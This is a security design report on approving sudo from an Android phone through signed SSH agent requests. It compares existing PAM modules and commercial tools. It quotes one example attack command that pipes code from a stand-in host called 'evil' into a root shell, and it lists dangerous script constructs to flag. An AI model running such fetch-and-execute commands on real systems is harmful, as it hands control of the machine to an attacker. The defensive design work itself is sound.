# Sudo approved from an Android phone, over SSH

A report, written on 2026-10-17, distilled from a conversation that began with whether screenlock-pin's PIN could work for `sudo` and ended somewhere else: approving each `sudo` on the phone, with the SSH agent protocol carrying the request. Nothing here is built. It would be a product of its own, in a repo of its own, sharing little with screenlock-pin beyond the review discipline. What was read in source code, checked online or written from memory is listed in the Confidence section near the end; the rest is reasoning.

## How this came up

- **A PIN for sudo was left out of screenlock-pin,** as `docs/chaos/pin-for-sudo.md` explains: at `sudo` the session is already unlocked, so a long password can be pasted from a password manager, and `sudo` deserves a credential of its own anyway.
- **The two attackers** of `docs/chaos/physical-vs-remote-attacks.md` explain why: the lock screen's attacker is physical, and a knowledge factor such as a PIN stops them; `sudo`'s attacker is remote, code running as the user or someone in over SSH, and only a physical action that code can't produce stops that.
- **Pasting from a password manager is its own nuisance.** KeePass wants its master password typed on top of the copy and paste, every time, and unlocking every password for the sake of one is the wrong shape.
- **FIDO2 does the physical part, but not everywhere.** A key isn't plugged into the VMs, containers and servers where `sudo` is typed, nobody is there to touch it, and it can't show what it approves.
- **So, the phone.** It is always with you, has a screen and a security chip, and can be reached from any machine connected to the internet.

## The idea

The phone holds a private key and the machine holds the matching public key. When you run `sudo`, root on the machine writes a note describing the request, the phone shows it, you approve, and the phone sends back a signature of the note. Root checks the signature against the note it wrote itself, and `sudo` runs. No password is typed or sent, and nothing secret leaves the phone.

## Step by step

- **Setup, once.** The phone makes a key pair and keeps the private half in its security chip. The public half goes on the machine, into `/etc/security/authorized_keys`, which only root can change.
- **The note.** You run `sudo dnf update`. sudo's PAM module, running as root, writes a note: a random number, user leo, host laptop, folder `/home/leo`, command `sudo dnf update`, the time.
- **The trip.** The note reaches the phone as an ordinary SSH agent "sign this" request: through the agent socket, back through SSH connections when the machine is remote, then the workstation, then the phone. Only the content is unusual: a normal agent signs it without looking, while the phone reads it.
- **The approval.** The phone shows the note. You read it and approve, unlocking the phone's key with a fingerprint or the phone's own PIN. The phone signs the note and sends back the signature, a few dozen bytes.
- **The check.** The PAM module verifies the signature with the public key against the note it wrote. One changed byte, a different command, or a signature of any other note, and `sudo` refuses.

A password is a secret handed over, and it can be stolen. A signature is proof that the phone saw this one note and you said yes. It is single-use, since the note holds a random number that never repeats.

## Where the security comes from

The approval holds because of two facts: the phone's key signed the note, and root checks that signature against the note it built itself. Neither depends on the path in between. The transport may be a hostile relay, and the worst it can do is drop or delay requests. A host signing key isn't needed for this binding, because a fake note earns a signature no real `sudo` accepts. A root-only host key would still let the phone flag requests that didn't come from root, which cuts the noise an attacker could use to confuse.

The exception is approving SSH logins, covered in Agent forwarding below: there, the phone's account of where a login goes rests on the host keys the client verified.

## Against a shadowed sudo

A shadowed `sudo`, an alias or function in `.bashrc` or a `~/bin/sudo` early in `PATH`, runs as the user and exists to capture the password.

- **There is nothing to capture.** No password is ever typed.
- **It can't fake an approval.** Only the phone holds the private key, and only root builds the note that will be checked.
- **It can run the real sudo with its own command,** say `sudo sh -c 'dnf update; curl evil | sh'`. That request is genuine, and root writes the real command into the note, so the phone shows it. Reading the phone's screen is the defence.
- **Number matching doesn't help here.** A code shown both in the terminal and on the phone stops a request from another terminal, but a shadowed `sudo` runs in your terminal and prints the matching code itself.
- **sudo's credential cache must be off,** with `timestamp_timeout=0`. Otherwise one honest-looking approval leaves the tty authenticated for minutes, and the shadowed `sudo`, running in that same tty, runs anything it likes without a new request.

FIDO2 keys can't do this, for two reasons. They have no screen, so a touch approves a request nobody sees. And they can't tell who is asking: any process running as the user can reach the key through `/dev/hidraw` and relay a real `sudo`'s challenge for a blind touch. A device with a screen, like a hardware wallet showing a transaction, would solve the first; host-built notes are still needed for the second.

## Showing more than the command

Root can also read the script being run and send its contents.

- **The file can change after approval.** A script the user can write can be swapped between the approval and the run. The robust fix is to run exactly the bytes approved, as sudo does for commands pinned by a digest in sudoers: it opens the file, checks the hash and executes that same open file. The simple rule is to refuse, or warn loudly, when the script, its interpreter or any directory on their paths is writable by the user.
- **The script is only the first hop.** Whatever the command reads from places the user can write is as much the attacker's as the script: `sudo make install` reads the Makefile, `sudo python tool.py` imports from the script's directory, scripts source helpers and read `~/.config`, `sudo dnf install ./pkg.rpm` runs the package's scriptlets, and `curl … | sh` runs whatever the server sends that moment. The plugin can't know what a command will read, so the phone should say what its review covers: "this command runs a file you can write", "the working directory is writable by you".
- **Nobody reads 500 lines on a phone.** Memory helps more than completeness: "same as approved on 2026-10-12" for an unchanged hash at the same path; a diff against the last approved version when it changed, which also catches a script changed behind the user's back; the full text only when it is new, with dangerous constructs flagged (`curl` or `wget` into a shell, `eval`, `chmod u+s`, writes to `/etc/sudoers` or `~/.ssh`, `LD_PRELOAD`).
- **The display must not lie by layout.** The arguments are authentic, but chosen by whoever ran `sudo`. Control characters and terminal escapes are shown as escapes, invisible and right-to-left Unicode made visible, lookalike characters flagged, each argument in a box of its own so `rm -rf / tmp` can't pass for `rm -rf /tmp`, and nothing cut short.

| What the phone shows | Trustworthy? |
|---|---|
| The command, its arguments, the target user, host and tty | Yes, root built the note |
| The script's contents and hash | Yes, if the file can't change before it runs |
| Everything the command reads later | No, so it is flagged whenever any of it is writable by the user |

## What goes into the note

The PAM module that builds the note fixes its fields. The transport doesn't care: the agent request is "sign these bytes", so the socket, the forwarding and any relay never change. Only the two ends do: the root-side note builder and the phone's parser. How much a new field costs:

- **Already there.** The original pam_ssh_agent_auth puts in a random cookie, the target user, the invoking user, the PAM service, the working directory, sudo's own command line as typed (read from `/proc/<its own pid>/cmdline`), the hostname and the time. If that is enough, the machine needs nothing new, only the phone's parser.
- **PAM can see it, but the module doesn't send it:** the tty, the parent process (which shell or script started `sudo`), the hash of a script named in the arguments. A few lines in the note builder, with a format version of its own so the phone knows how to read it.
- **PAM can't see it:** the resolved command path (`dnf` becoming `/usr/bin/dnf`), the target user of `-u`, what sudoers decided. PAM is only asked to authenticate a user. These need a sudo approval plugin, which sudo 1.9 and later can load and which gets them from sudo itself: new root-side code, with the phone and the transport unchanged.
- **Large content,** such as a whole script: its hash goes in the signed note and the text alongside; the phone hashes the text and checks it against the signed hash. Agent messages have a size cap, thought to be around 256 KB.

Two rules hold whatever is added:

- **Root gathers every field itself,** from its own process, from `/proc` or from files it reads, never from anything the user controls, such as an environment variable or a "description" argument. Otherwise a fake `sudo` writes whatever it likes and the phone shows it as fact.
- **Every machine needs the root-side code,** the module or plugin and the public key. That is the real cost for VMs and containers; a machine running stock software can only send what the stock module sends.

## Rules for requests and approvals

- **Separate keys for logins and for sudo,** and strict parsing on the phone. pam_ssh_agent_auth wraps its note as a message of type 54 (`SSH2_MSG_USERAUTH_TRUST_REQUEST`), while real logins sign type 50, so one can't pass for the other. Anything the phone can't parse, it refuses.
- **Number matching stays,** for requests from other terminals, with the limit Against a shadowed sudo above describes.
- **Rate limits.** Repeated pushes wear people down into approving one, as in the Uber breach of 2022. After a few denials the phone stops asking and says so.
- **The phone's own unlock for every use of the key,** so a thief holding the phone gets nothing. That pairs a physical factor, the phone in hand, with a knowledge or body factor, its unlock, as FIDO2 pairs a PIN with a touch.
- **Frequent SSH use** (`git push` many times an hour) may want an "this host and key for 10 minutes" window. It brings back silent signing for that window, so it should be per host and short. For `sudo`, each command is its own approval.

## Reaching the phone

- **Through the workstation.** A remote machine's request travels back over the SSH connection through the forwarded agent, and only the workstation talks to the phone. The remote machine needs no internet access and no pairing.
- **Through a relay,** for machines not reached over SSH. The relay is untrusted: the two ends authenticate each other with keys from pairing, the relay sees only ciphertext, and nonces stop replays. A malicious relay can only refuse service.
- **SSH all the way.** The phone can run an SSH client and connect to the workstation with agent forwarding (`ssh -A`), over WireGuard or Tailscale, since phones sit behind carrier NAT. The workstation then has an agent socket that leads back to the phone, and nothing custom remains on the path. The cost is a connection kept open, or opened on a push, and the battery that takes.
- **GrapheneOS** has no Google Play by default, so pushes would go through UnifiedPush with a self-hosted ntfy, or the app keeps its own connection.

## Agent forwarding

In simple terms: the laptop's agent holds the key, and a server you SSH into can send "please sign this" back through the SSH connection to that agent, which signs and returns the signature. The server gets the proof without ever getting the key.

Its bad reputation: while you are connected, root on that server can use the same path to have your agent sign anything, such as logging in as you to other machines, and a normal agent signs silently. With the phone as the agent, showing every request, root there can still ask, but you see the request and can refuse. That turns forwarding from a known hazard into something usable.

Agent restriction (`ssh-add -h`, experimental since OpenSSH 8.9) makes login approvals truthful. The agent records a `session-bind@openssh.com` binding for each connection and checks each key's allowed destinations against those bindings, so the phone can show "log in to B via A" from host keys the client verified. Its limits:

- it is enforced only with a cooperating client and server;
- whoever holds a forwarded socket can re-forward it to another allowed host;
- the source username was left out on purpose, because the agent can't trust it;
- one blog reports that before OpenSSH 10.5 a locked agent refused session-bind messages, so forwarded sessions looked local.

The hostname in a `sudo` note, by contrast, comes from the machine itself, so it is the machine's claim, which is one more reason for separate login and `sudo` keys.

## The phone

- **The key in the chip:** StrongBox on Pixels, the Titan M2, which in practice means P-256 keys (`ecdsa-sha2-nistp256`), the same limit the Mac's Secure Enclave has.
- **An unlock for every use,** as the rules above say.
- **One device per key.** Losing the phone loses the key, which is fine: the public keys on the machines are replaced, provided there is still a way in, as the next section explains.

## Fallback and lockout

Phones get lost, run flat and lose signal. On Fedora and Aurora root has no password, so a broken approval path with no way around it means no root at all. Keep a long password written down offline, not typed daily, and a second way to root: nresare's README suggests `doas` for exactly this.

## Decrypting secrets

The same phone could hold decryption keys, approving each use the way a TPM unseals under a policy. The SSH agent protocol only signs, though.

- **A signature as the key is tempting and wrong.** Signatures from the chip aren't guaranteed to be repeatable, and anyone who gets you to sign that same challenge again has the key.
- **A custom agent extension** works, since the protocol allows named extensions, but both ends are invented.
- **age plugins fit best.** age's plugin protocol was made for decryption keys held in hardware: age-plugin-yubikey, age-plugin-tpm and age-plugin-se, for the Secure Enclave, exist. A phone plugin is the natural piece. On the phone it needs ECDH key agreement in Android Keystore, available since Android 12; whether StrongBox supports it is open.

Decryption differs from `sudo` in one way: the cleartext necessarily comes back to the machine, so whatever runs there can read it once approved. The display matters even more: what is decrypted, for which host, for which process.

## Why SSH and not something new

SSH already gives the hard parts, the ones where subtle mistakes are fatal: key formats, signatures, `authorized_keys` as the list of who may, the agent protocol as the whole interface the phone must speak, an encrypted path to nearly every machine that runs `sshd`, and the verified host keys behind truthful login approvals. Building these from scratch would be reinventing a worse SSH.

What SSH doesn't give, and what is built regardless: what a request means and showing it (SSH authenticates connections, not actions; after login the whole session is trusted), the key in the phone's chip, and the root-side note builder. None of it is cryptography.

The resulting split: SSH for signing and for reaching remote machines, with the phone link SSH too if wanted; age for decryption; and of our own, only the note format, its builder and the phone app.

## What exists today

### On the machine

- **pam_ssh_agent_auth,** the original, in C (jbeverly). Its note is the one What goes into the note above describes, as read in its source: `pamsshagentauth_session_id2_gen` in `iterate_ssh_agent_keys.c`, the command line in `get_command_line.c`, the type 54 wrapper in `userauth_pubkey_from_id.c`. It connects to the agent for the invoking user's uid (`ssh_get_authentication_connection(uid)`). sudo must keep `SSH_AUTH_SOCK` (`env_keep`), so the caller chooses the socket; a proxy there can drop or delay requests, or swap in its own genuine request, which then shows honestly, but it can forge nothing. Last pushed in May 2023. Fedora removed it in Fedora 42, its package page now listing only Fedora 41, on the grounds that development had effectively stopped and that RHEL 10 was dropping it; CentOS Stream 10 and RHEL 10 don't ship it. Debian ships `libpam-ssh-agent-auth` 0.10.3, 0.10.3-11 in unstable. Red Hat's build had a memory-disclosure bug, CVE-2012-5536.
- **pam-ssh-agent,** a Rust rewrite (nresare) sharing no code, active (pushed 2026-10-14), with SSH certificates, aiming to be easy to review. Its challenge is 32 random bytes (`CHALLENGE_SIZE` in `src/auth.rs`), so a phone could only show "some sudo somewhere". Fedora packaging is an open issue, waiting on reviews of two Rust dependencies, `ssh-agent-client-rs` and `pam-bindings`; meanwhile there are a COPR repository and an Ubuntu PPA.
- **pam_rssh,** another Rust module (z4yx), the replacement Fedora's change proposal named: 219 stars, pushed August 2026, in production use by its own account, with `-sk` keys so a YubiKey touch works. It too signs 32 random bytes (`gen_challenge` in `src/sign_verify.rs`). No Fedora package was found.

So on Fedora and Aurora, the one note that carries the command exists only in the module that was dropped. The work is a note builder added to one of the Rust modules, which could be offered upstream; nresare's stated goal of being easy to review fits.

### Between the machine and the phone

- **OpenSSH's SecurityKeyProvider.** `ssh-sk-helper` loads a library exporting `sk_api_version`, `sk_enroll`, `sk_sign` and `sk_load_resident_keys`, specified in `PROTOCOL.u2f`; openssh-sk-winhello puts Windows Hello behind `-sk` keys this way. A phone provider would give `-sk` keys whose signatures carry a user-presence flag that sshd checks: the route to "the phone instead of a YubiKey for logins". It fits `sudo` worse: the provider is a library on the workstation, it sees only the login message and not the destination, and whether pam_ssh_agent_auth verifies `-sk` signatures wasn't confirmed.
- **Hybrid transport (caBLE),** Android's passkeys for other devices. Bluetooth proximity is deliberate, against phishing, and it is proximity to the machine running the client, so a VM reached through a forwarded agent from a nearby workstation would work in principle. It still doesn't fit. A FIDO authenticator shows only the site or app ("ssh:"), never the command, so approval is blind again. Devices without Google services, or before Android 14, lack the system WebAuthn framework, according to a Bitwarden community thread. And OpenSSH's `-sk` support goes through libfido2, which no source confirmed speaks hybrid; the Rust `libwebauthn` crate does.

### On the phone

- **Keyguard,** an SSH agent with an approval dialog per request and an optional approval window, working with Termux and the OpenKeychain API. Its keys live in its password vault, not in the chip.
- **A Termux setup** that signs with an Android Keystore key behind a fingerprint, as a do-it-yourself write-up.
- **Feature requests** in MonkeySSH and SkerrySSH for StrongBox keys and for the phone as a hardware key for the desktop, neither shipped.
- **Kryptonite** (krypt.co) once did the SSH half, the key on the phone and a push per signature, until it was acquired by Akamai and the open app discontinued.

### What companies use

- **Duo,** the closest to the idea: `pam_duo` pushes to the phone for `sudo`, `pushinfo = yes` puts the command in the push, and Duo Unix 2.2.0 and later adds Verified Push with a number to type. But Duo's cloud decides: the machine asks Duo's servers whether you approved, with no signature from the phone that the machine checks itself, and the machine must reach those servers. Where pam_duo takes the command from wasn't found, which matters for the rule that root gathers every field.
- **privacyIDEA,** self-hosted and open source, with push tokens and a PAM module, approving without signing over the command.
- **Teleport:** short-lived SSH certificates that expire in hours or minutes, so no revocation lists, and per-session MFA, a hardware-key touch to start each session. Per session, not per command, and blind.
- **Smallstep:** sign in through the identity provider, and `step ssh login` exchanges the token for an SSH certificate, 16 hours by default, kept in the agent. Removing someone from the identity provider ends their access in seconds. Its `sudo` handling, through its PAM and NSS modules, is described only in marketing text.
- **FreeIPA:** `pam_sss_gss` lets `sudo` accept the Kerberos ticket from login, with sudo rules managed centrally. Code running as the user can use the ticket too, so nothing approves each command.

Companies moved to short-lived certificates and central identity, which answer "who may log in, and until when", not "did you approve this command". Nobody ships the combination here: the phone shows the command, the phone signs the note, and the machine checks the signature itself, with no third party.

## The design, in short

- **The phone app** is an SSH agent with P-256 keys in StrongBox and an unlock per use. It parses type 54 notes (command, folder, host, user) and type 50 logins (with the hops from session-bind), shows them as Showing more than the command above requires, and refuses anything it can't parse.
- **The phone link** is SSH with agent forwarding from the phone over WireGuard or Tailscale, or a relay encrypted end to end with keys from pairing.
- **Remote machines** get the forwarded agent, with `ssh-add -h` restrictions on the login key and a separate key for `sudo`.
- **sudo** uses a note like pam_ssh_agent_auth's, added to a Rust module, with `timestamp_timeout=0`. An approval plugin can later add the resolved path and the script.
- **Decryption,** if wanted, goes through an age plugin.
- **The fallback** is a long password kept offline, and `doas` or another second way to root.

The cheapest first step is the phone-held agent and a Rust PAM module with the rich note. That alone covers SSH logins, local `sudo` and `sudo` on remote machines.

## Open questions

- Where `pam_duo` takes the command it pushes from.
- Whether StrongBox supports ECDH key agreement, for an age plugin.
- The agent protocol's exact message size cap.
- Whether pam_rssh is packaged for Fedora anywhere, and whether pam_ssh_agent_auth verifies `-sk` signatures.
- What a sudo approval plugin is given exactly, and whether it can complete a round with the phone before sudo runs the command.
- How GrapheneOS copes with a long-lived connection or UnifiedPush wake-ups, and the battery cost.
- How much to put on the screen before people stop reading it.

## Confidence

- **Read in source code:** what pam_ssh_agent_auth puts in its note and how it wraps it; that pam-ssh-agent and pam_rssh sign 32 random bytes.
- **Checked online:** the packaging in Fedora, RHEL and Debian; CVE-2012-5536; agent restriction and its limits, the OpenSSH 10.5 bug only from one blog; the SecurityKeyProvider interface; hybrid transport's proximity and the limit without Google services; the phone-side apps; Duo's `pushinfo` and Verified Push; Teleport, Smallstep and FreeIPA.
- **From memory, not checked:** Kryptonite's history; privacyIDEA's push; sudo's approval plugin API and its digest execution; Android Keystore's ECDH; StrongBox's P-256 limit, though the Secure Enclave write-up supports the same limit there; the agent message size cap; the age plugins named; the Uber breach as the example of push fatigue.

## Sources

- jbeverly/pam_ssh_agent_auth: https://github.com/jbeverly/pam_ssh_agent_auth
- pam_ssh_agent_auth(8): https://linux.die.net/man/8/pam_ssh_agent_auth
- pam_ssh_agent_auth(8), openSUSE Leap 16.0: https://manpages.opensuse.org/Leap-16.0/pam_ssh_agent_auth/pam_ssh_agent_auth.8.en.html
- CVE-2012-5536: https://nvd.nist.gov/vuln/detail/CVE-2012-5536
- Passwordless sudo with PAM and ssh-agent forwarding: https://pacbard.duckdns.org/articles/202308-sudo-ssh-agent
- Fedora, Remove pam-ssh-agent component: https://fedoraproject.org/wiki/Changes/Remove_pam-ssh-agent_component
- Fedora Discussion, F42 change proposal: https://discussion.fedoraproject.org/t/f42-change-proposal-deprecate-pam-ssh-agent-component-self-contained/138977
- Fedora Packages, pam_ssh_agent_auth: https://packages.fedoraproject.org/pkgs/openssh/pam_ssh_agent_auth/
- Debian, libpam-ssh-agent-auth: https://packages.debian.org/sid/libpam-ssh-agent-auth
- Debian Package Tracker, pam-ssh-agent-auth: https://tracker.debian.org/pkg/pam-ssh-agent-auth
- nresare/pam-ssh-agent: https://github.com/nresare/pam-ssh-agent
- nresare/pam-ssh-agent, Fedora packaging issue: https://github.com/nresare/pam-ssh-agent/issues/24
- z4yx/pam_rssh: https://github.com/z4yx/pam_rssh
- OpenSSH, SSH agent restriction: https://www.openssh.com/agent-restrict.html
- OpenSSH, PROTOCOL.agent: https://fuchsia.googlesource.com/third_party/openssh-portable/+/refs/heads/main/PROTOCOL.agent
- ssh-add(1): https://man.he.net/man1/ssh-add
- openssh-unix-dev, agent restriction testing (2022): https://lists.mindrot.org/pipermail/openssh-unix-dev/2022-January/039886.html
- Locking ssh-agent disabled its restrictions: https://everywan.com/en/blog/locking-ssh-agent-disabled-its-restrictions
- openssh-sk-winhello: https://github.com/tavrez/openssh-sk-winhello
- OpenSSH sk-api.h: https://code.fizz.buzz/mirror/freebsd/src/branch/main/crypto/openssh/sk-api.h
- openssh-unix-dev, call for testing OpenSSH 8.2: https://lists.mindrot.org/pipermail/openssh-unix-dev/2020-February/038252.html
- Thales, hybrid transport: https://thalesdocs.com/oip/fido2-sdk/fido2-sdk-hybrid-transport/
- libwebauthn: https://docs.rs/crate/libwebauthn/0.5.1
- Bitwarden community, FIDO hybrid support: https://community.bitwarden.com/t/native-fido-hybrid-protocol-passkey-support-qr-code-login-for-untrusted-environments/94084
- W3C public-webauthn, October 2025: https://lists.w3.org/Archives/Public/public-webauthn/2025Oct/0143.html
- SK keys on login-plus.discoverer.bg: https://docs.discoverer.bg/sk_keys.html
- Keyguard, SSH agent setup: https://keyguard.dev/docs/ssh-agent/
- Termux, SSH with Android Keystore: https://microsounds.github.io/notes/termux-ssh-fingerprint.htm
- MonkeySSH issue 940: https://github.com/depollsoft/MonkeySSH/issues/940
- SkerrySSH issue 407: https://github.com/SeCherkasov/SkerrySSH/issues/407
- Secure Enclave SSH keys: https://termai.sh/blog/secure-enclave-ssh-keys
- Duo Unix: https://duo.com/docs/duounix
- pam_duo(8): https://unix.com/man-page/debian/8/pam_duo
- puppet-duo_unix: https://github.com/pebtron/puppet-duo_unix
- Teleport, authentication architecture: https://goteleport.com/docs/architecture/authentication
- Teleport, authentication and session joining: https://goteleport.com/docs/zero-trust-access/authentication/
- Teleport infrastructure identity: https://jwatte.com/blog/blog-teleport-infrastructure-identity/
- Smallstep, how SSH works: https://smallstep.com/docs/ssh/how-it-works
- Smallstep, step ssh login: https://smallstep.com/docs/step-cli/reference/ssh/login/
- Smallstep, single sign-on for SSH: https://smallstep.com/blog/diy-single-sign-on-for-ssh
- Red Hat, GSSAPI authentication for sudo on an IdM client: https://docs.redhat.com/ko/documentation/red_hat_enterprise_linux/10/html/managing_idm_users_groups_hosts_and_access_control_rules/enabling-gssapi-authentication-for-sudo-on-an-idm-client
- FreeIPA workshop, sudo rules: https://freeipa.readthedocs.io/en/stable/_sources/workshop/8-sudorule.rst
